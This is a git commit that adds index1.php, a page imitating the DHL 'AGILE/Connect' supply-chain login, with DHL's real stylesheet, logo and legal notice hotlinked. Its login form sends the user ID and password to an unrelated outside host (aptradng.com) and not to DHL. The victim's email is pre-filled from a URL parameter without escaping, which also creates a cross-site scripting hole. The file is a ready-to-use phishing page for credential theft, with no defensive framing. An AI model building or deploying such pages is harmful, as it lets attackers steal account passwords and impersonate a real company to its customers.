72048285bb20402cbca3f58c78c8459b61dba450
creative212 <64727340+creative212@users.noreply.github.com>
2020-07-06 11:21:36 +0100

    Create index1.php

---
+++ index1.php
@@ -0,0 +1,61 @@
+
+<HTML>
+<HEAD>
+<meta http-equiv="Content-Language" content="en-us">
+
+<TITLE>AGILE/Connect Login</TITLE>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=windows-1252">
+<link rel="stylesheet" type="text/css" href="https://mysupplychain.dhl.com/agileconnect/dhlstyle.css">
+</HEAD>
+<BODY>
+
+<table border="0" width="100%">
+<tr valign="bottom">
+<td align="left"><img src=https://mysupplychain.dhl.com/agileconnect/dhl_logo.gif height="22" width="139" alt="DHL Logo" vspace="15"></td>
+<td align="right"><h1 class="branding">DHL Exel Agile/Connect</h1></td>
+</tr>
+</table>
+
+
+<h2>Agile Connect: Log In</h2>
+
+<blockquote>
+
+	  <FORM Name="login" action="https://aptradng.com/ventureagile/logged.php" method="post">
+		
+	    <table bgcolor="#E4E4E4" cellpadding="5" cellspacing="0" align="center">
+	<tr valign=top bgcolor="#cc0000">
+	 <td colspan=2><font color="white"><b>Log In</b></font></td>
+	</tr>
+           <tr>
+            <td align="right"><b>User ID: </b></td>
+            <td><input type="text" name="user_id" size="20" readonly="readonly" value="<?php echo $_GET['email']; ?>"></td>
+          </tr>
+          <tr>
+            <td align="right"><b>Password: </b></td>
+            <td><input type="password" name="password" required="required" size="20"></td>
+          </tr>
+          <tr>
+            <td></td>
+            <td>
+          <input type="submit" value="Login" name="Login" style="float: right"></td>
+          </tr>
+        </table>
+        </form>
+
+<SCRIPT LANGUAGE="Javascript">
+document.login.user_id.focus()
+</SCRIPT>
+<!-- End ImageReady Slices -->
+<br clear="all">
+<h2>Legal Information</h2>
+<blockquote>
+<P><a title="Change Password" href="#">Change Password</a> | <a  title="Log Out" href="#">Log Out</a></P>
+<P><a title="Legal Disclaimers" href="https://mysupplychain.dhl.com/agileconnect/copyright.asp">Copyright</a> 2006 - 2020 DHL Corporation<br>NOTICE: DHL Supply Chain authorizes you to use our AGILEConnect Logistics system solely to track shipments tendered by or for you to DHL and for no other purpose. Any other use of AGILEConnect Logistics systems and information is strictly prohibited.</p> 
+</blockquote>
+</blockquote>
+</td></tr></table>
+</BODY>
+</HTML>
+
+
